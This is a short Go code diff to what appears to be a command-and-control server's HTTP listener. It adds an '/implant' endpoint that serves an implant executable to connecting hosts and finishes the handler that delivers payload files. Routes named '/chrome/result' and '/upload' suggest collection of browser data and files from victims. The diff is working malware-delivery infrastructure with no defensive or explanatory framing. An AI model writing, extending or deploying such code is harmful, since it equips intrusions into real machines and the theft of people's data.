@@ -50,6 +50,7 @@ func (m *Manager) Start(l *db.Listener) error {
 	hl.mux.HandleFunc("/payloads/", hl.handlePayload)
 	hl.mux.HandleFunc("/chrome/result", hl.handleChromeResult)
 	hl.mux.HandleFunc("/upload", hl.handleUpload)
+	hl.mux.HandleFunc("/implant", hl.handleImplant)
 
 	hl.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		fmt.Printf("[!] Unmatched request: %s %s\n", r.Method, r.URL.Path)
@@ -419,7 +420,6 @@ func (hl *HTTPListener) handleUpload(w http.ResponseWriter, r *http.Request) {
 }
 
 func (hl *HTTPListener) handlePayload(w http.ResponseWriter, r *http.Request) {
-
 	path := r.URL.Path
 	if len(path) <= len("/payloads/") {
 		http.Error(w, "not found", http.StatusNotFound)
@@ -448,6 +448,29 @@ func (hl *HTTPListener) handlePayload(w http.ResponseWriter, r *http.Request) {
 	}
 
 	fmt.Printf("[*] Serving payload %s (%d bytes)\n", filename, len(data))
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
+	w.WriteHeader(http.StatusOK)
+	w.Write(data)
+}
+
+func (hl *HTTPListener) handleImplant(w http.ResponseWriter, r *http.Request) {
+	implantPath := filepath.Join("payloads", "implant.exe")
+
+	if _, err := os.Stat(implantPath); os.IsNotExist(err) {
+		fmt.Printf("[!] Implant not found: %s\n", implantPath)
+		http.Error(w, "not found", http.StatusNotFound)
+		return
+	}
+
+	data, err := os.ReadFile(implantPath)
+	if err != nil {
+		fmt.Printf("[!] Failed to read implant: %v\n", err)
+		http.Error(w, "read error", http.StatusInternalServerError)
+		return
+	}
+
+	fmt.Printf("[*] Serving implant.exe (%d bytes) to %s\n", len(data), r.RemoteAddr)
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
 	w.WriteHeader(http.StatusOK)
